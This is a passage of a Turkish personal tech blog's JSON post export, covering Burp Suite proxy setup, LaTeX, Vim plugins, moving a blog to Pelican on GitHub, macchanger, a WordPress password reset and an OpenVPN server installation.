üzerinde hali hazırda Burp Suite'in ücretsiz sürümü bulunmaktadır. Eğer indiremek isterseniz kendi sitesinden indirebilirsiniz. Yine sanallaştırma yazılımı üzerinde Kali Linux'u çalıştırabilirsiniz. Bunların yanında tabiki bir web tarayıcısına ihtiyacımız bulunmaktadır. Ben Firefox kullanıyorum. Burpsuit'in Ayarlanması Burp Suite'i üzerine barındıran Kali ve bWapp web uygulamasını üzerinde barındıran makinalar sanallaştırma yazılımı üzerinde koşmaktadır. Kullandığım Firefox ise kendi host makinamda bulunmaktadır. Kendi host makinamdan Kali Linux üzerindeki Burp Suite ile konuşabilmek için ilk önce Burp Suite'in proxy ayarlamalarını yapmalıyız. Burp Suite default olarak localhost(127.0.0.1)'in 8080 portunu dinlemektedir. Yani dışarıdan erişilemez. Biz ise host makinadan yani dışarıdan erişmek istediğimiz için ilk önce Burp Suite üzerinde Proxy->Options->Edit sekmesinden dinlenen adresi bilgisayarımızın ipsine çekmeliyiz. Firefox'un Ayarlanması Firefox'un proxy ayarlamasını Tercihler->Gelişmiş->Ağ->Ayarlar sekmesinden yapıyoruz. Yukarıda gördüğünüz gibi proxy ipsi olarak Kali Linux ipsini verdim. Artık Firefox üzerinden yapmış olduğumuz her bir istek Burp Suite üzerinden geçecektir. Burp Suite için ortam ayarlaması bu kadar kolay. Bundan sonraki yazılarda Burp Suite kullanımını anlatmaya çalışacağım. Kolay gelsin.","tags":"Burp Suite","title":"Burp Suite 1: Burpsuit'e Giriş ve Ortam Kurulumu"},{"url":"http://www.mazlumagar.com/kucuk-bir-latex-deneyimi.html","text":"Merhabalar, Bugün size Latex ile yaşadığım ilk deneyimimden, basitce kurulumundan ve kullanımından bahsetmek istiyorum. Daha sonrada öğrenmek adına kendim için hazırladığım cv örneğinin tex ve pdf dosyasını paylaşacağım. Bitirme projesinin raporlama kısmında bende herkes gibi Microsoft Word kullandım. Açıkcası bazı noktalarda beni deli etti. Halit'in muhteşem Latex övgülerinden sonra ben de öğrenme kararı aldım. Kurulum Ben mac ve arch linux sistemlerine kurulum yaptım. Bunlardan kısaca bahsedeyim. MAC Kurulumu İlk önce tex kurmalısınız. Bunun için buradan indirerek kurulumu yapın. Daha sonra editör olarak textmaker için kendi sitesinden sisteminize uygun olan versiyonu indirerek kurunuz. Arch Kurulumu Arch için sırası ile şu komutları çalıştırın. $ sudo pacman -S texlive-most $ sudo pacman -S texmaker Kurulum tamamlandıktan sonra örnek olarak Texmaker'da Wizard->Quick Start sekmesinden hızlı bir başlangıç ile Texmakerın sizin için bir döküman oluşturmasını sağlayabilirsiniz. Bu adımı uygularsanız döküman içerisinde şu kodları göreceksiniz. \\documentclass [10pt,a4paper] { book } \\usepackage [utf8] { inputenc } \\usepackage { amsmath } \\usepackage { amsfonts } \\usepackage { amssymb } \\begin { document } İlk döküman örneği \\end { document } İlk satırda documentclass ile hazırlanacak olan dökümanın yazı boyutunu, kağıt boyutunu ve ne tür bir döküman olduğu belirtilmiş. Daha sonra bazı paketler içeri dahil edilmiş ve \\begin{document} ile dökümana başlanılmıştır. Texmaker içerisinde menüden Quick Build derseniz derlenecek ve bulunduğu dizine PDF dosyasını oluşturacaktır. Benim bu aşamadan sonra ilk yaptığım işlem Latex ile ilgili çok güzel olan Türkçe İnce bir LATEX 2ε Elkitabı 'ını okumaya başlamak oldu. Türkçe hali hazırda zaten çok güzel bir kaynak olduğu için ben aynı şeyleri tekrar etmemek adına latex anlatımına girmeyeceğim. Merak edenler bu kitabı okuyabilirler. Açıkcası ben hemen hemen yarısını okudum ama bir süreden sonra komutları tek tek denemediğim için sıkıldım ve ihtiyacım oldukça internetten bakarım diyerek okumayı bıraktım. Onun yerine öğrenmek için kendime bir cv hazırlamaya karar verdim. Latex'i online olarak kullanmak isterseniz gayet başarılı bir site olan sharelatex 'i kullanabilirsiniz. Kendi içerisinde ihtiyaca göre kategorilenmiş hazır şablonlarıda bulundurmaktadır. Açıkcası ben de sıfırdan bir döküman yazacağımı sanmıyorum. Yapacağım işlemler hazır olan bir şablonu düzenlemek olacaktır, ki cv örneğinde de bunu yaptım. Latex kurulumu ile sisteme hali hazırda bir çok paket kurulmaktadır. Ama kurulu olmayan bir paket için https://www.ctan.org/ adresini kullanabilirsiniz. CV Örneği Hazırlamış olduğum CV'nin .tex dosyasına cv.tex linkinden ulaşabilirsiniz. İlk başta biraz karmaşık gelebilir. Ama bir süre sonra alışıyorsunuz. Aynı dosyanın çıktısını ise cv.pdf linkinden ulaşabilirsiniz. Pdf dosyasında gördüğünüz gibi her şey çok nizami ve tatlı. NOT: Açıkcası ben Latex'in Word'ten daha kullanışlı olduğuna karar verdim. Word ile döküman hazırlarken bazı durumlara göz ile karar verme durumları çok canımı sıkıyor. Burada öyle bir durum söz konusu değil herşey komut ile yapıldığı için tüm işlemleri Latex kendisi hallediyor. Bunun yanında matematiksel operatörlerin kullanımı çok daha kolay. Bizim gibi kod yazan insanlar dökümana kod eklemek için genelde ekran görüntüsünü döküman içerisine eklemektedir. Latexde ise kod ekleme işlemini text olarak yapmaktadır. Kod eklemek için Listings paketini inceleyebilirsiniz. Not: Yukarıda belirttiğim gibi bende ilk defa bugün Latex ile haşır neşir oldum ve çoğu komutunu, kullanımını bilmiyorum. Ama bundan sonra hazırlayacağım tüm dökümanları Latex ile hazırlayacağım ve hazırlarken öğreneceğim.","tags":"Tags","title":"Küçük Bir Latex Deneyimi"},{"url":"http://www.mazlumagar.com/kendime-not-vim-kisayollari.html","text":"Not: Bu yazı kendime hatırlatma olarak yazılmaktadır. KISAYOL AÇIKLAMASI w Bir sonraki kelimenin başına gider. e Bir sonraki kelimenin sonuna gider. b Önceki kelimenin başına gider. [sayi]+f+[karakter] Sayi sonraki karekteri bulur. Sayi girilmez ise bir sonraki karakteri bulur. [sayi]+F+[karakter] Sayi önceki karakteri bulur. Sayi girilmez ise bir önceki karakteri bulur. 0 Satır başına gider. $ Satır sonuna gider. gg Dosya başına gider. G Dosya sonuna gider. [Satir numarası]G Girilen satır numarasına gider. /[aranacak ifade] Arama işlemi yapar. n Arama işleminden sonra eşleşen bir sonraki ifadeye gider. N Arama işleminden sonra eşleşen bir önceki ifadeye gider. o veya O Yeni satır ile insert moduna geçer. [Sayi]x İmlecin sağındakini sayı kadar siler. Herhangi bir sayı girilmezse imcelin sagındaki karakteri siler. [Sayi]X İmcelin solundakini sayı kadar siler. Herhangi bir sayı girilmezse imcelin solundaki karakteri siler. r İmlecin bulundugu karakteri değiştirir. dw İmlecin sağındaki ilk kelimeyi siler. d[sayi]e İmlecin sağındaki sayi kadar kelimeyi siler. . Silme işleminin ardından bir önceki silme işlemini tekrar eder.","tags":"Vim","title":"Kendime Not: Vim Kısayolları"},{"url":"http://www.mazlumagar.com/pelican-ile-github-uzerinde-blog-olusturma.html","text":"Merhabalar, Sonunda bende blogumu Github'a taşıdım. Bildiğiniz gibi bir çok static web site generator bulunmakta. Daha önce Jekyll ile Github üzerinde Blog Oluşturma yazısında bu işlemin Jekyll ile nasıl yapılabileceğinden bahsetmiştim. Bu sefer ise Python ile geliştirilmekte olan Pelican kullanmaya karar verdim. Bu yazıda kısaca Wordpress'ten Pelican'a nasıl sitemi taşıdığımdan bahsedeceğim. İlk önce Wordpress üzerinde hali hazırda var olan bloğumdaki yazıları export etmem gerekti. Wordpress admin panelinden bu işlemi xml dosya formatında alabiliyorsunuz. Pelican ile blog yazarken markdown(.md) veya reStructuredText(.rst) formatlarını kullanabiliyorsunuz. Ben markdown yazmayı tercih ediyorum. Tabi ki ilk önce yapmamız gereken sistemimize Pelican'ı kurmak. Bu işlem için ilk önce Python ile bir virtual environment oluşturacağız. virtualenv ~/venv/pelican source ~/virtualenv/pelican/bin/activate Venv oluşturduk ve daha sonra aktif ettik. Şimdi Pelican'ı sistemimize kurabiliriz. pip install Markdown pip install typogrify pip install pelican Sırası ile yukarıdaki komutları çalıştırarak gerekli olan paketleri sistemimize kuruyoruz. Bu aşamadan sonra ilk önce Wordpress'den aldığımız xml formatındaki yazıları markdown'a çevirelim. pelican - import -- wpfile mazlumagar . wordpress . 2016 - 03 - 20. xml -- markup markdown Yukarıdaki komutu çalıştırdıktan sonra bulunduğunuz dizin içerisinde bir outpu dizini oluşacak ve yazılarınızın .md uzantılı biçimde burada oluştuğunu göreceksiniz. Yazılarımızı çevirdiğimize göre artık pelican ile sitemizi oluşturmaya başlayabiliriz. pelican-quickstart Bu komutu çalıştırdıktan sonra pelican size siteniz ile alakalı bazı sorular soracak. Bu soruları kendinize göre cevaplayın. Oluşturulmasını istediğiniz dizin içerisinde projenizin oluştuğunuzu göreceksiniz. Dizin içeriği şu şekilde olacaktır; Buradaki her dosyadan uzun uzun bahsetmemize gerek olduğunu düşünmüyorum. Bizim için en önemli olanlar; pelicanconf.py: Bu dosya içerisinde pelican ile ilgili ayarlamaları yapacağız. content: Bu dizin içerisinde yazılarımızı ve sayfalarımızı markdown olarak yazacağız. output: Bu dizin içerisinde ise pelican tarafından oluşturulmuş olan .html dosyalarımız bulunacaktır. Github'a bu dosyaları atacağız. Şimdi ilk önce pelicanconf.py dosyasından başlayalım. Ben kendi conf dosyamı sizinle paylaşayım ve içerisinde önemli olan kısımları açıklayalım. Sizin vermiş olduğunuz cevaplara göre pelican sizin için bir conf dosyası oluşturdu. from __future__ import unicode_literals AUTHOR = u'mazlumagar' SITENAME = u'Mazlum A \\u011f ar' SITEURL = 'http://www.mazlumagar.com' SITESUBTITLE = \"[ 'Linux', 'Python', 'Django', 'Web App', 'Cyber Security', 'Octosec' ]\" THEME = 'themes/blog' PATH = 'content' PLUGIN_PATHS = [ 'pelican-plugins' ] PLUGINS = [ 'better_codeblock_line_numbering' , 'sitemap' ] FEED_ALL_ATOM = 'feeds/all.rss.xml' FEED_ALL_RSS = 'feeds/all.rss' CATEGORY_FEED_ATOM = 'feeds/ %s .rss.xml' SITEMAP = { 'format' : 'xml' , 'priorities' : { 'articles' : 0.5 , 'indexes' : 0.5 , 'pages' : 0.5 }, 'changefreqs' : { 'articles' : 'monthly' , 'indexes' : 'daily' , 'pages' : 'monthly' } } TIMEZONE = 'Europe/Istanbul' DEFAULT_LANG = u'en' FEED_ALL_ATOM = None CATEGORY_FEED_ATOM = None TRANSLATION_FEED_ATOM = None AUTHOR_FEED_ATOM = None AUTHOR_FEED_RSS = None LINKS = (( 'Pelican' , 'http://getpelican.com/' ), ( 'Python.org' , 'http://python.org/' ), ( 'Jinja2' , 'http://jinja.pocoo.org/' ), ( 'You can modify those links in your config file' , '#' ),) SOCIAL = (( 'You can add links in your config file' , '#' ), ( 'Another social link' , '#' ),) DEFAULT_PAGINATION = 15 STATIC_PATHS = [ 'assets' ] İncelediğiniz zaman anlaması gayet basit bir dosya. Burada bahsetmemiz gereken bazı değişkenler bulunmakta. THEME Proje içerisinde hangi temayı kullandığınızı belirttiğiniz değişkendir. Ben temayı halitten çarptım :). Yani benim pelican projem içesinde 'themes/blog' dizini içerisinde tema bulunmakta. Siz de https://github.com/getpelican/pelican-themes adresinden kendinize uygun bir tema seçerek projenize çekebilirsiniz. PLUGIN_PATHS Bu değişken pelican pluginlerinin bulunduğu dizinleri göstermektedir. Bende proje dizini içerisinde pelican-plugins dizini içerisinde bulunduğu için bu şekilde atama yapılmıştır. Tüm pluginlere https://github.com/getpelican/pelican-plugins adresinden erişebilirsiniz. PLUGINS Kullanılan pluginlerin belirtildiği değişkendir. Ben kod numaralandırma ve sitemap için plugin kullanıyorum. Geri kalan değişkenlerin hepsini teker teker açıklama gereği bulmuyorum. Az önce dediğim gibi yazılarımızı content içerisinde oluşturacağız. Bu dizin içerisinde bende şu şekilde bir mimari var. assets: Resimler gibi bağımlılıkların bulunduğu dizin. pages: about.md(hakkımda) ve contact.md(iletişim) olmak üzere oluşturduğum iki sayfanın bulunduğu dizin. posts: Yazıların bulunduğu dizin. Html sayfasına geçmeden önce bir yazı oluşturalım. Bu yazı üzerinden gidebiliriz. posts dizini içerine oluştuduğum pelican-ile-github-uzerinde-blog-olusturma.md dosyası şu şekilde; Title : Pelican ile Github Ü zerinde Blog Olu ş turma Date : 2016 - 03 - 23 03 : 14 Author : mazlumagar Category : Github Tags : github , pelican Slug : pelican - ile - github - uzerinde - blog - olusturma Status : published Merhabalar , ... Yazının en başında yazı hakkındaki bilgileri verdikten sonra klasik markdown yazıyoruz. Yazımızı oluşturduğumuza göre artık pelicana bizim için html dosyalarını oluşturmasını söyleyebiliriz. pelican content -s publishconf.py Bu komutu verdikten sonra output dizini içerisinde dosyaların oluştuğunu görebilirsiniz. Şimdi localde sitemizi ayaga kaldıralım. cd output python -m pelican.server Komutları çalıştırdıktan sonra tarayıcınızda localhost:8000 yazarak oluşturmuş olduğunuz siteyi görebilirsiniz. NOT: Localde çalışırken publishconf.py dosyası içerisinde şu değişikliği yapın. SITEURL = '' Evet buraya kadar pelican ile basit anlamda bir site oluşturduk ve localde ayağa kaldırdık. Bildiğiniz gibi github üzerinde kullanici_adi.github.io adında bir repo oluşturursanız bu repoya http://kullanici_adi.github.io domaini altından erişebiliyorsunuz. Bizim içinde pelican ile oluşturduğumuz output dizini önemli. Eğer bu dizini kullanici_adi.github.io reposuna pushlarsanız urlden ulaşabildiğiniz göreceksiniz. Domain Yönlendirme Kendi domaininizi githuba yönlendirmek isteyebilirsiniz. Bunun için ilk önce github reposu içerisinde CNAME adında bir dosya oluşturun ve içerisine domain adını yazın. Daha sonra domain panelinize giderek iki tane A kayıt tipi oluşturmalı ve değer olarak aşağıdaki ip adreslerini vermelisiniz. 192.30.252.153 192.30.252.154 Faydalı olması dileğiyle, kolay gelsin.","tags":"Github","title":"Pelican ile Github Üzerinde Blog Oluşturma"},{"url":"http://www.mazlumagar.com/vim-vundle-ve-nerdtree-eklentisi.html","text":"İlk önce şu komutu çalışytırıyoruz. $ git clone https://github.com/VundleVim/Vundle.vim.git ~/.vim/bundle/Vundle.vim Bu komut ile Vundle sistemimize çektik. Daha sonra home dizini altındaki .vimrc dosyasını düzenlememiz gerekiyor. set rtp+=~/.vim/bundle/Vundle.vim call vundle#begin() Plugin 'VundleVim/Vundle.vim' Plugin 'scrooloose/nerdtree' syntax enable set background=dark colorscheme solarized call vundle#end() filetype plugin indent on 1, 2, 11, 12. satırlara dikkat edin bu satırların var olaması gerekmektedir. Bunları ekledikten sonra istediğiniz bir eklentiyi kurmak için yapmamanız gereken Plugin ile başlayan satırları eklemektir. Burada ben nerdtree eklentisini eklemiş bulunmaktayım. Burada hangi eklenti için nasıl yazmam gerekiyor diye düşünebilirsiniz. Plugin 'scrooloose/nerdtree' Vundle kurulum yaparken github üzerinden eklentileri çekmektedir. Yukarıdaki scroolose Github kullanıcı adı iken nerdtree ise repo adıdır. Bu şekilde Github üzerinde vim için olan tüm eklentileri bu dosyaya ekleyebilirsiniz. Ekleme işlemi yaptıktan sonra kurulum için ise vim editörünü açtıktan sonra :PluginInstall komutunu çalıştırmanız gerekmektedir. Vundle sizin için eklemiş olduğunuz tüm eklentileri kuracaktır. NERDTree eklentisini bu şekilde kurmuş olduk. NERDTree Eklentisi NERDTree eklentisini kurduk. Kullanımı da oldukça basit. Vim editörünü açtıktan sonra :NERDTree komutunu çalıştırıyoruz. Gördüğünüz gibi komutu çalıştırdıktan sonra, sol tarafta vimi çalıştırdığımız dizinden itibaren dosya ve dizinler listelendi. Burada vimi nasıl açtığımı merak edebilirsiniz. Çalışma dizinime gittikten sonra; ➜ vimtest vim . Şimdi kullanımından ve kısa yollardan kısaca bahsedelim. Sol taraftaki menüde iken ? işaretine basarsanız yardım kısmının açıldığını görebilirsiniz. Zaten yardım kısmında oldukça detaylı kısa yollardan bahsedilmiş ama ben en çok işime yarayanlardan kısaca bahsedeceğim. NOTE : ? işareti Toogle mantığı ile çalışmaktadır. NERDTree Eklentisi Kısayolları KISAYOL AÇIKLAMASI o NORDTree penceresinde dosya üzerinde o tuşuna basarsanız çalıştığınız dosya yerine bastığınız dosya açılır. t Dosyayı yeni tabda açar ve taba geçiş yapar. T Dosyayı yeni tabda açar. Taba geçiş yapmaz. gt Bir sonraki taba geçer. gT Bir önceki taba geçer. i Dosyayı var olan dosya yerine açmak yerine sayfayı yatay bölerek açar. s Dosyayı var olan dosya yerine açmak yerine sayfayı dikey bölerek açar. CTRL+ww Tüm penceler arası sırası ile geçiş yapmanızı sağlar. CTRL+wh Sol pencereye geçmeyi sağlar. CTRL+wj Alt pencreye geçmeyi sağlar. CTLR+wk Üst pencreye geçmeyi sağlar. CTRL+wl Sağ pencereye geçmeyi sağlar Daha fazla bilgi için ? işaretinden yararlanabilirsiniz. Son olarak eğer python kodu yazdıysanız ve bunu vimden ayrılmadan yorumlatmak istiyorsanız, ESC tuşuna bastıktan sonra şunları yazmanız yeterli. :! python % => Bulunduğunuz dosya için :! python file.py => Dosya adı ile","tags":"Vim","title":"Vim Vundle ve NERDTree Eklentisi"},{"url":"http://www.mazlumagar.com/macchanger-kullanimi.html","text":"Merhaba, macchanger, mac adresinizi değiştirmenizi sağlayan bir araçtır. Bu yazıda kullanımından bahsedeceğiz. Kali ve Blackarch gibi işletim sistemleri ile beraber gelmektedir. Github üzerinden kaynak kodlarına görebilirsiniz. ➜ ~ macchanger -h GNU MAC Changer Usage: macchanger [options] device -h, --help Print this help -V, --version Print version and exit -s, --show Print the MAC address and exit -e, --ending Don't change the vendor bytes -a, --another Set random vendor MAC of the same kind -A Set random vendor MAC of any kind -p, --permanent Reset to original, permanent hardware MAC -r, --random Set fully random MAC -l, --list[=keyword] Print known vendors -b, --bia Pretend to be a burned-in-address -m, --mac=XX:XX:XX:XX:XX:XX Set the MAC XX:XX:XX:XX:XX:XX -h parametresi ile nasıl kullanıldığını görebilmekteyiz. ➜ ~ macchanger -s eno16777736 Current MAC: 00:0c:29:08:bc:ed (VMware, Inc.) Permanent MAC: 00:0c:29:08:bc:ed (VMware, Inc.) -s parametresi ile verdiğimiz arayüze ait olan kalıcı ve kullanılmakta olan mac adreslerini görebiliriz. Eğer ethernet arayüzünüzün adını bilmiyorsanız ifconfig komutu ile öğrenebilirsiniz. ➜ ~ macchanger -r eno16777736 Current MAC: 00:0c:29:08:bc:ed (VMware, Inc.) Permanent MAC: 00:0c:29:08:bc:ed (VMware, Inc.) New MAC: 5e:38:5f:9d:96:f9 (unknown) -r parametresi ile rastgele bir mac adresi ataması yaptık. Tekrardan -s ile bakarsanız current yani kullanılmakta olan mac adresinizi görebilirsiniz. ➜ ~ macchanger -l | grep \"Intel\" 0298 - 00:01:2a - Telematica Sistems Inteligente 0692 - 00:02:b3 - Intel Corporation 0840 - 00:03:47 - Intel Corporation 1060 - 00:04:23 - Intel Corporation ... -l parametresi ile bilinen sağlayıcıların mac adres başlangıçlarını görebilirsiniz. Biz burada intele ait olanları görüntüledik. ➜ ~ macchanger eno16777736 --mac=00:0c:29:08:bc:ed ➜ ~ macchanger eno16777736 -m 00:0c:29:08:bc:ed Current MAC: 5e:38:5f:9d:96:f9 (unknown) Permanent MAC: 00:0c:29:08:bc:ed (VMware, Inc.) New MAC: 00:0c:29:08:bc:ed (VMware, Inc.) Yukarıdaki iki komut ile istediğimiz bir mac adresi ataması yapabilmekteyiz.","tags":"Güvenlik","title":"macchanger Kullanımı"},{"url":"http://www.mazlumagar.com/arch-linux-cift-monitore-tek-resim-yerlestirme.html","text":"Merhaba, Eğer Arch Linux'u çift monitor kullanıyorsanız ve tek duvar resmini ikisine birden yaymak istiyorsanız aşağıdaki adımları takip edebilirsiniz. Ben i3lock ile bu işlemi yaptığım için ilk önce kurulumunu gerçekleştiriyoruz. #pacman -S i3lock Ardından home dizini altındaki .xinitrc dosyasına şu satırı ekliyoruz. xautolock --time 1 -locker 'i3lock -i /path/to/wallpaper.png' > /dev/null 2 >&1 & Şimdi keyboard ayarlarına gelerek kısayollar sekmesinden kısayol ataması yaparken çalışacak komutu belirteceğiz. Gördüğünüz gibi bende ekranımı kitleme kısayolu olarak ctrl+alt+del atanmış ve ben karşısına çalışacak komutu belirttim. Yukarı .zinitrc dosyasına ekleme işlemi yaparken tırnak içerisine yazdığım komutu buraya da yazdım. Burada dikkat etmeniz gereken wallpaper olarak kullanacağınız resmin ekranınıza uygun olması. Örneğin benim monitörlerimin ekran boyutu 1920*1080. Bundan dolayı wallpaper olarak kullandığım resim 3840x1080 boyutlarında.","tags":"Linux","title":"Arch Linux Çift Monitöre Tek Resim Yerleştirme"},{"url":"http://www.mazlumagar.com/wordpress-mysql-ile-sifre-sifirlama.html","text":"Merhaba, Eğer sizde bir gün wordpress şifrenizi unutursanız diye mysql ile nasıl sıfırlanabileceğini buraya not alıyorum. mysql -u root -p komutunu yazdıktan sonra root şifresi ile mysql kabuğuna düşüyoruz. Ardından aşağıdaki komutu çalıştırarak kullanıcı için yeni şifre atama işlemini gerçekleştiriyoruz. UPDATE wp_users SET user_pass = MD5('password') WHERE ID=1 LIMIT 1;","tags":"Wordpress","title":"Wordpress Mysql ile Şifre Sıfırlama"},{"url":"http://www.mazlumagar.com/ubuntu-14-04-uzerine-openvpn-kurulumu.html","text":"Merhaba, bu yazıda Ubuntu 14.04 üzerine OPENVPN nasıl kurulduğu? Sunucu ve kullanıcılar için nasıl sertifikalar oluşturulduğu? Linux kullanıcısı ile nasıl authentication sağlandığı? gibi sorulara yanıt aramaya çalışacağız. Daha doğrusu bu kaynağın çevirisini yapacağız ve devamında eklemeler ile devam edeceğiz. İlk önce sistemi updateleyelim. -Buradan sonra çalıştıracağımız tüm komutları root kullanıcısı ile çalıştı oluşturmalıyız. apt-get update; apt-get upgrade Şimdi openvpn ve easy-rsa uygulamalarını kuralım. apt-get install openvpn easy-rsa Daha sonra server ayarlarını yapacağımız dosyayı oluşturmalıyız. Bunun için openvpn ile gelen örnek server.conf dosyasını kullanacağız ve kendimize göre düzenleyeceğiz. Bu dosyayı openvpn dizinine taşımak için şu komutu çalıştırıyoruz. gunzip -c /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz > /etc/openvpn/server.conf Daha sonra server.conf dosyasını vim editörü ile açıyoruz. Openvpn şifreleme yaparken RSA kullanmaktadır. Default olarak 1024 bit kullanılmaktadır. Biz onu 2048 olarak değiştireceğiz. Şöyle bir satır göreceksiniz. # Diffie hellman parameters. # Generate your own with: # openssl dhparam -out dh1024.pem 1024 # Substitute 2048 for 1024 if you are using # 2048 bit keys. dh dh1024.pem Bu satırı şu hale getiriyoruz. dh dh2048.pem Server.conf dosyası üzerinde bir kaç değişiklik daha yapacağız. Aşağıdaki yorum satırını bulun ve başındaki \";\" kaldırarak. Yorum satırı olmaktan çıkartın. ... # or bridge the TUN/TAP interface to the internet # in order for this to work properly). ;push \"redirect-gateway def1 bypass-dhcp\" Yeni hali şu şekilde olacaktır. Bu şekilde vpn sunucu trafiği üzerinden geçirebilecekir. push \"redirect-gateway def1 bypass-dhcp\" Daha sonra yine aynı dosya içerisinde dns ayarlarının bulunduğu satırı yorum satırı olmaktan çıkartacağız. ;push \"dhcp-option DNS 208.67.222.222\" ;push \"dhcp-option DNS 208.67.220.220\" Bu satırların başındaki \";\" ifadelerini kaldırın. Son olarak aynı dosya içerisinde openvpnin nouser ve nogroup olarak çalışması için ayarlamayı yapmamız gerekiyor. openvpn default olarak root kullanıcısı ile çalışmaktadır. # You can uncomment this out on # non-Windows systems. ;user nobody ;group nogroup Bu satırları bularak başlarındaki \";\" ifadelerini kaldırın. Dosya üzerindeki yaptığınız değişiklikleri kaydederek çıkın. NOT: vim editörü üzerinde yaptığınız değişiklileri kaydetmek için ESC tuşuna bastıktan sonra \":x\" ifadesini yazın ve enter tuşuna basın. Packet Forwarding Sunucumuzun paket yönlendirme işlemini yapabilmesi için bazı işlemler yapmamız gerekiyor. Bunun için ilk önce şu komutu çalıştırarak paket yönlendirme işlemine izin veriyoruz. echo 1 > /proc/sys/net/ipv4/ip_forward Daha sonra vim /etc/sysctl.conf dosyası içerisinde şu satırları buluyoruz ve komut satırı olmaktan çıkartıyoruz. # Uncomment the next line to enable packet forwarding for IPv4 #net.ipv4.ip_forward=1 Yeni hali şu şekilde olacaktır. net.ipv4.ip_forward=1 Openvpn kurulumunu başarılı bir şekilde gerçekleştirdik. Şimdi ilk önce kimlik doğrulama işlemi için sertifikalar oluşturmalıyız. Sunucu Trafı Sertifika Yazının en başında easy-rsa uygulamasını kurmuştuk. Onunla birlikte gelen sertifika oluşturmamız için gerekli olan dosyaları openvpn dizinine taşıyalım; cp -r /usr/share/easy-rsa/ /etc/openvpn Daha sonra oluşturacağımız key dosyaları için bir dizin oluşturalım. mkdir /etc/openvpn/easy-rsa/keys Daha sonra oluşturacağımız sertifakaların tanımlamalarını yapmak için vars dosyasını düzenlememiz gerekiyor. vim /etc/openvpn/easy-rsa/vars Bu dosya içerisinde aşağıdaki satırları kendimize göre düzenlemeliyiz. export KEY_COUNTRY=\"US\" export KEY_PROVINCE=\"TX\" export KEY_CITY=\"Dallas\" export KEY_ORG=\"My Company Name\" export KEY_EMAIL=\"sammy@example.com\" export KEY_OU=\"MYOrganizationalUnit\" export KEY_NAME=\"server\" En aşağıdaki KEY_NAME değişkenine dikkat edin. Bu değişkene göre sertifikamızı üreteceğiz. Eğer farklı bir değer yazarsanız ileride sertifika üretme kısmında bu değeri kullanınız. Buraya kadar herşey yolundaysa aşağıdaki komut çalıştıralım. openssl dhparam -out /etc/openvpn/dh2048.pem 2048 Bu işlem biraz sürecektir. Bundan sonra çalıştığımız dizini çalıştıralım. cd /etc/openvpn/easy-rsa Bulunduğumuz dizin içerisinde aşağıdaki komutu çalıştırıyoruz. . ./vars Bu komut size şu şekilde bir uyarı verebilir. NOTE : If you run ./ clean - all , I will be doing a rm - rf on /etc/openvpn/easy-rsa/ keys Bunun için şu komutu çalıştırıyoruz. ./clean-all Ve ardından aşağıdaki komutu çalıştırarak işlemi bitiriyoruz. ./build-ca Sunucu Sertifikasını ve Keyini Oluşturma Keyi oluşturmak için şu komutu çalıştırıyoruz. ./build-key-server server Buradaki \"server\" kelimesine dikkat ediniz. Yukarıda bu değer kullanmıştık. Karşımıza şu şekilde sorular gelecektir. Please enter the following 'extra' attributes to be sent with your certificate request A challenge password []: An optional company name []: Biz bu değerleri yukarıda atadığımız için hepsini default bırakarak enter tuşuna başabiliriz. Sign the certificate? [y/n] 1 out of 1 certificate requests certified, commit? [y/n] Sertifika ile vpne bağlanabilmemiz sağlayacak yukarıdaki iki soruyu y yazarak cevaplayınız. Sertifikamızı oluşturduk. Şimdi openvpn dizinine bunları taşıyalım. cp /etc/openvpn/easy-rsa/keys/{server.crt,server.key,ca.crt} /etc/openvpn Openvpni başlatalım. service openvpn start service openvpn status Eğer herşey yolunda ise şu şekilde bir çıktı alacaksınız. VPN 'server' is running Kullanıcılar için Sertifika ve Key Oluşturma cd /etc/openvpn/easy-rsa Dizin değiştirdikten sonra aşağıdaki komut ile oluşturma işlemini yapıyoruz. ./build-key client Yukarıda yaptığımız işlemin aynısını tekrarlıyoruz ve gelen soruları defaultta bırakarak entera basıyoruz. Karşımıza gelen Sign the certificate? [y/n] 1 out of 1 certificate requests certified, commit? [y/n] iki soruyu aynı şekilde \"y\" seçerek enter tuşuna basıyoruz. Şimdi server.conf dosyasında yaptığımız gibi openvpn ile birlikte gelen örnek client.conf dosyasını openvpn ana dizinine taşıyoruz. cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/easy-rsa/keys/client.ovpn Kurulum işlemimiz tamamdır. Şimdi bu oluşturduğumuz dosyaları sunucu tarafından kendi bilgisayarımıza çekmeliyiz. Almamız gereken dosyalar şunlar; /etc/openvpn/easy-rsa/keys/client.crt /etc/openvpn/easy-rsa/keys/client.key /etc/openvpn/easy-rsa/keys/client.ovpn /etc/openvpn/ca.crt Bu dosyaları isterseniz scp ile doğrudan sunucudan alabilirsiniz. Veya dosyaların içeriği çok büyük olmadığı için \"cat\" ile içeriklerini okuduktan sonra bilgisayarınızda aynı isim ile oluşturduğunuz dosyalara kopyalayabilirsiniz. Dosyaları çektikten sonra dizin içerisi şu şekilde olmalıdır. client.ovpn client.key ca.crt client.key Tüm dosyaları eksiksiz bir biçimde aldığımızdan emin olduktan sonra client.ovpn dosyasını düzenlememiz gerekiyor. İlk önce sunucu ipmizi yazmalıyız. Dosya içerisinde şu satırı bulun # The hostname/IP and port of the server. # You can have multiple remote entries # to load balance between the servers. remote my-server-1 1194 ;remote my-server-2 1194 \"my-server-1\" yazan yere kendi sunucu ipnizi yazın. Herşey bu kadar eğer buraya kadar bir sıkıntı yapmadan ilerleyebildiysek vpnimizin çalışması gerekiyor. Çalıştırmak için şu komutu yazabiliriz. openvpn --config client.conf Burada bağlandıktan sonra muhtemelen internete çıkamayacaksınız. Bu sıkıntıyı ortadan kaldırabilmek için sunucu tarafında şu komutu çalıştırmalıyız. iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE Bu komuttan sonra sıkıntısız bir şekilde bağlanabilmemiz gerekiyor. VPNimiz çalışıyor :). Umarım sizinkide başarılı bir şekilde çalışıyordur. Şimdi burada gördüğünüz gibi 4 tane dosyamız var gelin bunu tek bir dosya haline getirelim. client.ovpn dosyasını açarsanız. Şu satırları görebilirsiniz. ca ca.crt cert client.crt key client.key Bu satırları isterseniz silin veya yorum satırı haline getirin. Ardından dosya içerisinde herhangi bir yere şu şekilde bir kullanım ile diğer dosyaların içeriğini yapıştıracağız. <ca> ca.crt dosyasının içeriği </ca> <cert> client.crt dosyasının içeriği </cert> <key> client.key dosyasının içeriği </key> Dosyamızın içeriği şu şekilde olacaktır. <ca> -----BEGIN CERTIFICATE----- . . . -----END CERTIFICATE----- </ca> <cert> Certificate: . . . -----END CERTIFICATE----- . . . 